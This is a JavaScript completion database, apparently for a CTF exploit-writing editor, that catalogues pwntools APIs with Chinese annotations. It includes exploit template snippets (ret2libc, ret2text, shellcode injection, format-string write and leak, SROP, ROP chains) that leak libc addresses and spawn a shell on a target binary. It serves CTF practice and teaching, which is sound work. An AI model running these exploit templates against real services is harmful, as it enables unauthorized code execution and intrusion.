/**
 * PwnCraft EXP 补全数据库 (v0.32) — pwntools 常用函数 / 成员 / exp 模板片段。
 *
 * 来源：pwntools 官方文档（docs.pwntools.com tubes/intro）、社区速查表
 * （anvbis/pwntools-cheatsheet）、CTF Wiki 基本 ROP 与社区 exp 模板。
 * 只收录真实存在且社区 exp 高频使用的 API；不造不存在的函数。
 * 结构被 app.js 的 Monaco completion provider 消费。
 */
(() => {
  'use strict';

  // ---- 全局函数 / 类（from pwn import * 之后直接可用） ----
  const functions = [
    // 连接与进程
    { label: 'context', detail: '全局运行环境', doc: "`context(arch='amd64', os='linux', log_level='debug')`；成员见 context. 补全", cat: 'tubes' },
    { label: 'process', detail: '本地进程', doc: '启动本地目标。\n`p = process(["./pwn"], env={"LD_PRELOAD": "./libc.so.6"})`', cat: 'tubes' },
    { label: 'remote', detail: '远程连接', doc: '`p = remote("1.2.3.4", 1337)`', cat: 'tubes' },
    { label: 'listen', detail: '本地监听', doc: '`l = listen(1337); l.wait_for_connection()`', cat: 'tubes' },
    { label: 'ssh', detail: 'SSH 通道', doc: '`s = ssh("user", "host", password="...")`；`s.process("./pwn")` 可获得带 pty 的 tube', cat: 'tubes' },
    { label: 'gdb.attach', detail: '附加调试', doc: '`gdb.attach(p, gdbscript="b *main")` —— 需 context.terminal 已设置', cat: 'tubes' },
    { label: 'gdb.debug', detail: '起进程并调试', doc: '`gdb.debug("./pwn", gdbscript="b *main\\nc")`，可加 `aslr=False`', cat: 'tubes' },
    // Tube IO（tube 通用方法）
    { label: 'send', detail: '发送数据', doc: '`p.send(payload)`', cat: 'io' },
    { label: 'sendline', detail: '发送一行', doc: '`p.sendline(payload)` —— 自动追加 \\n', cat: 'io' },
    { label: 'sendafter', detail: '收到再发', doc: '`p.sendafter(delim, payload)` = recvuntil + send', cat: 'io' },
    { label: 'sendlineafter', detail: '收到再发一行', doc: '`p.sendlineafter(b"choice:", payload)` —— 最高频组合', cat: 'io' },
    { label: 'recv', detail: '接收数据', doc: '`p.recv(numb=4096, timeout=default)`', cat: 'io' },
    { label: 'recvline', detail: '接收一行', doc: '`line = p.recvline()`', cat: 'io' },
    { label: 'recvuntil', detail: '接收直到', doc: '`p.recvuntil(b"option:")`；常用 `drop=True` 去掉分隔符', cat: 'io' },
    { label: 'recvn', detail: '接收定长', doc: '`p.recvn(8)` —— 精确接收 n 字节', cat: 'io' },
    { label: 'recvall', detail: '接收全部', doc: '`p.recvall(timeout=5)`', cat: 'io' },
    { label: 'clean', detail: '清空缓冲', doc: '`p.clean(timeout=0.5)` —— 丢弃残余输出', cat: 'io' },
    { label: 'interactive', detail: '交互模式', doc: '`p.interactive()` —— exp 收尾拿 shell', cat: 'io' },
    { label: 'close', detail: '关闭连接', doc: '`p.close()`', cat: 'io' },
    { label: 'shutdown', detail: '关闭写端', doc: '`p.shutdown("send")` —— 触发目标 read EOF', cat: 'io' },
    // 打包 / 数值
    { label: 'p8', detail: '打包 1 字节', doc: '`p8(0x41)`', cat: 'pack' },
    { label: 'p16', detail: '打包 2 字节', doc: '`p16(0x1234)`', cat: 'pack' },
    { label: 'p32', detail: '打包 4 字节', doc: '`p32(0xdeadbeef)` —— 按 context.arch 端序', cat: 'pack' },
    { label: 'p64', detail: '打包 8 字节', doc: '`p64(0x7f1234567890)` —— 按 context.arch 端序', cat: 'pack' },
    { label: 'u32', detail: '解包 4 字节', doc: '`u32(leak.ljust(4, b"\\x00"))`', cat: 'pack' },
    { label: 'u64', detail: '解包 8 字节', doc: '泄露地址经典写法：`u64(p.recvuntil(b"\\x7f")[-6:].ljust(8, b"\\x00"))`', cat: 'pack' },
    { label: 'flat', detail: '拼接字节流', doc: '`flat(b"a"*0x70, pop_rdi, binsh, system)` —— 自动按架构打包每个整数', cat: 'pack' },
    { label: 'pack', detail: '任意位宽打包', doc: '`pack(0x4142, 24)`', cat: 'pack' },
    { label: 'cyclic', detail: '循环填充串', doc: '`cyclic(0x100, n=8)` —— 定偏移填充', cat: 'pack' },
    { label: 'cyclic_find', detail: '查偏移', doc: '`cyclic_find(p64(core.fault_addr)[:8] if ...)`；常用 `cyclic_find(0x6161616161616166, n=8)`', cat: 'pack' },
    // 汇编 / shellcode
    { label: 'asm', detail: '汇编', doc: '`asm("xor rdi, rdi; mov rax, 59; syscall")` —— 按 context.arch', cat: 'asm' },
    { label: 'disasm', detail: '反汇编', doc: '`disasm(bytes)`', cat: 'asm' },
    { label: 'shellcraft', detail: 'shellcode 模板', doc: '`asm(shellcraft.sh())`；`asm(shellcraft.cat("flag"))`；`shellcraft.syscall("SYS_execve", ...)`', cat: 'asm' },
    { label: 'hexdump', detail: '十六进制转储', doc: '`hexdump(data)`', cat: 'asm' },
    { label: 'unhex', detail: 'hex 解码', doc: '`unhex("4142")`', cat: 'asm' },
    // ELF / libc
    { label: 'ELF', detail: '解析 ELF', doc: '`elf = ELF("./pwn"); libc = ELF("./libc.so.6")`；`libc.address = base` 后符号自动重定位', cat: 'elf' },
    { label: 'LibcSearcher', detail: 'libc 版本查询（需安装）', doc: '`libc = LibcSearcher("puts", leak); base = leak - libc.dump("puts"); system = base + libc.dump("system")`', cat: 'elf' },
    // ROP
    { label: 'ROP', detail: 'ROP 链构建器', doc: '`rop = ROP(elf)`；`rop.call(elf.plt["puts"], [elf.got["puts"]])`；`payload = flat(offset, rop.chain())`', cat: 'rop' },
    { label: 'SigreturnFrame', detail: 'SROP 帧', doc: '`frame = SigreturnFrame(); frame.rax = constants.SYS_execve; ...; payload += bytes(frame)`', cat: 'rop' },
    { label: 'constants', detail: '系统调用常量', doc: '`constants.SYS_execve`、`constants.SYS_read`', cat: 'rop' },
    // 格式化字符串
    { label: 'fmtstr_payload', detail: '格式化串写 payload', doc: '`fmtstr_payload(6, {elf.got["printf"]: elf.sym["system"]}, numbwritten=0)`', cat: 'fmt' },
    { label: 'FmtStr', detail: '自动测偏移', doc: '`fmt = FmtStr(execute_fmt=snd); fmt.offset; fmt.write(addr, val); fmt.execute_writes()`', cat: 'fmt' },
    // 日志
    { label: 'log', detail: 'pwntools 日志', doc: '`log.info("...")` / `log.success("leak: %#x", addr)`', cat: 'log' },
  ];

  // ---- 成员补全：按接收者给出该对象的常用成员 ----
  const members = {
    elf: [
      { label: 'symbols', detail: "符号地址表", doc: "elf.symbols['main']（等价 elf.sym）" },
      { label: 'sym', detail: '符号地址表（短名）', doc: "elf.sym['system']" },
      { label: 'plt', detail: 'PLT 地址表', doc: "elf.plt['puts']" },
      { label: 'got', detail: 'GOT 地址表', doc: "elf.got['puts']" },
      { label: 'search', detail: '搜索字节串', doc: "next(elf.search(b'/bin/sh'))" },
      { label: 'section', detail: '取节内容/地址', doc: "elf.section('.bss')" },
      { label: 'address', detail: '基址（可写重定位）', doc: 'libc.address = leak_base 后 elf.sym 全部自动加基址' },
      { label: 'read', detail: '读文件内容', doc: 'elf.read(addr, 8)' },
      { label: 'libc', detail: 'ELF 使用的 libc', doc: 'elf.libc' },
    ],
    libc: [
      { label: 'sym', detail: '符号地址表', doc: 'libc.sym["system"]（address 设置后自动带基址）' },
      { label: 'symbols', detail: '符号地址表', doc: 'libc.symbols["str_bin_sh"] 不存在时用 search' },
      { label: 'search', detail: '搜索字节串', doc: 'next(libc.search(b"/bin/sh\\x00"))' },
      { label: 'address', detail: '基址', doc: 'libc.address = leak - libc.sym["puts"]' },
    ],
    p: [
      { label: 'sendlineafter', detail: '收到再发一行', doc: 'p.sendlineafter(b"choice:", b"1")' },
      { label: 'sendafter', detail: '收到再发', doc: 'p.sendafter(b">", payload)' },
      { label: 'sendline', detail: '发送一行', doc: 'p.sendline(payload)' },
      { label: 'send', detail: '发送', doc: 'p.send(payload)' },
      { label: 'recvuntil', detail: '接收直到', doc: 'p.recvuntil(b"leak:")' },
      { label: 'recvline', detail: '接收一行', doc: 'p.recvline()' },
      { label: 'recv', detail: '接收', doc: 'p.recv(0x100)' },
      { label: 'interactive', detail: '交互模式', doc: 'p.interactive()' },
      { label: 'clean', detail: '清空缓冲', doc: 'p.clean(0.2)' },
    ],
    io: [
      { label: 'sendlineafter', detail: '收到再发一行' }, { label: 'sendafter', detail: '收到再发' },
      { label: 'sendline', detail: '发送一行' }, { label: 'send', detail: '发送' },
      { label: 'recvuntil', detail: '接收直到' }, { label: 'recvline', detail: '接收一行' },
      { label: 'recv', detail: '接收' }, { label: 'interactive', detail: '交互' },
    ],
    context: [
      { label: 'arch', detail: "架构", doc: "context.arch = 'amd64' / 'i386'" },
      { label: 'os', detail: '操作系统', doc: "context.os = 'linux'" },
      { label: 'log_level', detail: '日志级别', doc: "context.log_level = 'debug'" },
      { label: 'terminal', detail: 'gdb 终端', doc: "context.terminal = ['cmd.exe','/c','wsl.exe','bash','-c']" },
      { label: 'binary', detail: '默认二进制', doc: 'context.binary = elf' },
      { label: 'update', detail: '批量设置', doc: 'context.update(arch="amd64", os="linux")' },
      { label: 'local', detail: '作用域内设置', doc: 'with context.local(log_level="error"): ...' },
    ],
    rop: [
      { label: 'call', detail: '加入调用', doc: 'rop.call(elf.plt["puts"], [elf.got["puts"]])' },
      { label: 'raw', detail: '加入原始值', doc: 'rop.raw(0xdeadbeef)' },
      { label: 'find_gadget', detail: '找 gadget', doc: 'rop.find_gadget(["pop rdi", "ret"]).address' },
      { label: 'rdi', detail: 'pop rdi; ret', doc: 'rop.rdi.address' },
      { label: 'rsi', detail: 'pop rsi; ret', doc: 'rop.rsi.address' },
      { label: 'rdx', detail: 'pop rdx; ret', doc: 'rop.rdx.address' },
      { label: 'ret', detail: '单个 ret（栈对齐）', doc: 'rop.ret.address' },
      { label: 'chain', detail: '生成链字节流', doc: 'payload = flat(offset, rop.chain())' },
      { label: 'dump', detail: '打印链', doc: 'log.info(rop.dump())' },
    ],
    frame: [
      { label: 'rax', detail: '寄存器字段' }, { label: 'rdi', detail: '寄存器字段' },
      { label: 'rsi', detail: '寄存器字段' }, { label: 'rdx', detail: '寄存器字段' },
      { label: 'rip', detail: 'rip（通常设为 syscall）', doc: 'frame.rip = syscall_ret' },
      { label: 'registers', detail: '寄存器读写器', doc: 'frame.rax = constants.SYS_execve' },
    ],
    log: [
      { label: 'info', detail: '信息日志' }, { label: 'success', detail: '成功日志' },
      { label: 'warning', detail: '警告日志' }, { label: 'debug', detail: '调试日志' },
    ],
  };

  // ---- 模板片段（社区高频 exp 骨架，见 CTF Wiki / 社区模板） ----
  const snippets = [
    {
      label: 'exp', detail: 'EXP 完整骨架',
      insert: [
        'from pwn import *',
        '',
        "context(arch='${1:amd64}', os='linux', log_level='debug')",
        "context.terminal = ['cmd.exe', '/c', 'wsl.exe', 'bash', '-c']",
        '',
        "elf = ELF('./${2:pwn}')",
        "libc = ELF('./libc.so.6')",
        '',
        "def start():",
        "    if args['G']:",
        '        return gdb.debug(elf.path)',
        "    return process(elf.path)${3:  # 或 remote('ip', port)}",
        '',
        'p = start()',
        '',
        '$0',
        '',
        'p.interactive()',
      ].join('\n'),
    },
    {
      label: 'ret2libc', detail: '泄露 libc → system("/bin/sh")',
      insert: [
        "puts_plt = elf.plt['puts']",
        "puts_got = elf.got['puts']",
        "pop_rdi = ${1:0x401263}  # ROPgadget --binary ./pwn | grep 'pop rdi'",
        'offset = ${2:0x78}      # cyclic 定位',
        '',
        "payload = flat(b'a' * offset, pop_rdi, puts_got, puts_plt, elf.sym['main'])",
        "p.sendlineafter(b'${3:Input:}', payload)",
        '',
        "leak = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))",
        "log.success('puts leak: %#x', leak)",
        'libc.address = leak - libc.sym[\'puts\']',
        "binsh = next(libc.search(b'/bin/sh\\x00'))",
        "payload2 = flat(b'a' * offset, ${4:pop_rdi}, binsh, libc.sym['system'])",
        'p.sendline(payload2)',
        'p.interactive()',
        '$0',
      ].join('\n'),
    },
    {
      label: 'ret2text', detail: '跳过程序自带后门',
      insert: [
        "backdoor = ${1:0x401176}  # IDA 里的 system('/bin/sh') 或 cat flag 函数地址",
        'offset = ${2:0x78}',
        "payload = flat(b'a' * offset, backdoor)",
        "p.sendlineafter(b'${3:Input:}', payload)",
        'p.interactive()',
        '$0',
      ].join('\n'),
    },
    {
      label: 'shellcode', detail: '写入可执行段并跳转',
      insert: [
        "shellcode = asm(shellcraft.sh())",
        "bss = elf.section('.bss')  # 或 ida 里的可读可写可执行地址",
        "p.sendlineafter(b'${1:input:}', shellcode)",
        "payload = flat(b'a' * ${2:offset}, ${3:bss})",
        'p.sendline(payload)',
        'p.interactive()',
        '$0',
      ].join('\n'),
    },
    {
      label: 'fmt', detail: '格式化字符串任意写',
      insert: [
        '# 偏移：在目标 printf 处输入 AAAAAAAA %%6\\$p 逐个试出 offset',
        "payload = fmtstr_payload(${1:6}, {${2:elf.got['printf']}: ${3:elf.sym['system']}}, numbwritten=${4:0})",
        'p.sendline(payload)',
        "$0",
      ].join('\n'),
    },
    {
      label: 'fmtleak', detail: '格式化字符串泄露',
      insert: [
        "p.sendline(b'AAAAAAAA%%6\\$p')",
        "leak = p.recvuntil(b'\\n', drop=True)",
        "leak = u64(leak.split(b'AAAAAAAA')[1].ljust(8, b'\\x00'))",
        "log.success('leak: %#x', leak)",
        '$0',
      ].join('\n'),
    },
    {
      label: 'srop', detail: 'SROP SigreturnFrame',
      insert: [
        'from pwn import *',
        '',
        'frame = SigreturnFrame()',
        "frame.rax = constants.SYS_execve",
        'frame.rdi = ${1:binsh}',
        'frame.rsi = 0',
        'frame.rdx = 0',
        'frame.rip = ${2:syscall_ret}',
        "payload = flat(b'a' * ${3:offset}, ${4:syscall_gadget}, 15, bytes(frame))",
        'p.sendline(payload)',
        'p.interactive()',
        '$0',
      ].join('\n'),
    },
    {
      label: 'ropchain', detail: 'ROP 类构建链',
      insert: [
        'rop = ROP(elf)',
        "pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address",
        "rop.call(elf.plt['puts'], [elf.got['puts']])",
        "rop.call(elf.sym['main'])",
        "payload = flat(b'a' * ${1:offset}, rop.chain())",
        'p.sendline(payload)',
        '$0',
      ].join('\n'),
    },
    {
      label: 'u64leak', detail: '标准地址泄露行',
      insert: "leak = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nlog.success('leak: %#x', leak)\n$0",
    },
  ];

  window.PwnExpCompletions = { functions, members, snippets };
})();
